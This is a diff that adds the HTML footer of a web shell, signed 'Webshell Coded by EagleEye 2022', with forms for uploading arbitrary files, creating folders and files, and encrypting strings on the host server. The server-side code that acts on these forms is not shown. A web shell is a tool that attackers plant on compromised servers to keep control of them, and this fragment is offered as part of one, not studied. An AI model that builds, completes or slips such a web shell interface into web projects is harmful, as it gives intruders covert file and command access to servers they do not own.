@@ -1,0 +1,38 @@
+<section class='footer'>
+<table>
+
+<tr><td><label>Upload File : </label></td><td><label>New Folder : </label></td></tr>
+<tr><td><form action='' method='POST' enctype='multipart/form-data'>
+<input type="file" id="actual-btn" name='dffile' hidden required/>
+<label for="actual-btn" id='file-chosen'>Choose File</label>
+<input type='submit' name='dfupload'>
+</form></td><td>
+<form action='' method='POST'>
+<input type='text' name='newfolder' required>
+<input type='submit' name='createfolder'>
+</form></td></tr>
+
+
+<tr><td><label>New File : </label></td><td><label>Encrypt String: </label></td></tr>
+<tr><td><form action='' method='POST'>
+
+<input type='text' name='newfile' required>
+<input type='submit' name='createfile'>
+</form></td><td>
+<form action='' method='POST'>
+<input type='text' name='encstr'>
+<input type='submit' name='toencstr'>
+</form></td></tr>
+</table>
+</section>
+<script>
+const actualBtn = document.getElementById('actual-btn');
+const fileChosen = document.getElementById('file-chosen');
+actualBtn.addEventListener('change', function(){
+  fileChosen.textContent = this.files[0].name
+})
+</script>
+<section class='eagle'>
+<img src='https://avatars.githubusercontent.com/u/87413459?v=4'>
+<p>Webshell Coded by EagleEye 2022</p>
+</section>
